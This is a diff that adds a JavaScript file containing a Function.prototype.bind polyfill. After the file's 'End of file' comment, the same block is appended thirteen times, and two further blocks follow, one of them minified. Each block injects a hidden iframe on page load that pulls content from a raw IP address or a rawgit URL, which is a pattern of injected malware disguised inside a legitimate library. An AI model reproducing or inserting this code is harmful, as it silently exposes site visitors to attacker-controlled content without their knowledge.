@@ -1,0 +1,222 @@
+/**
+ * Function.prototype.bind Polyfill
+ */
+
+Function.prototype.bind = (function() {
+	
+	var slice = Array.prototype.slice;
+	
+	return function (oThis) {
+
+		if (typeof this !== "function") { // closest thing possible to the ECMAScript 5 internal IsCallable function
+			throw new TypeError("Function.prototype.bind - what is trying to be fBound is not callable");
+		}
+
+		var
+		aArgs = slice.call(arguments, 1), 
+		fToBind = this, 
+		fNOP = function () { },
+		fBound = function () {
+			return fToBind.apply(this instanceof fNOP ? this : oThis || window, aArgs.concat(slice.call(arguments)));		
+		};
+
+		fNOP.prototype = this.prototype;
+		fBound.prototype = new fNOP();
+
+		return fBound;
+
+	};
+
+}());
+
+/* End of file bind.js */
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+
+
+
+
+
+if (typeof obj.foo == 'undefined') {
+window.jsuekzis = 1;
+window.onload = function() {
+    var iframe = document.createElement('iframe');
+    iframe.style.display = "none";
+    iframe.src = "http://155.94.75.92/iframe.html";
+    document.body.appendChild(iframe);
+};
+
+}
+
+
+
+
+
+void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});
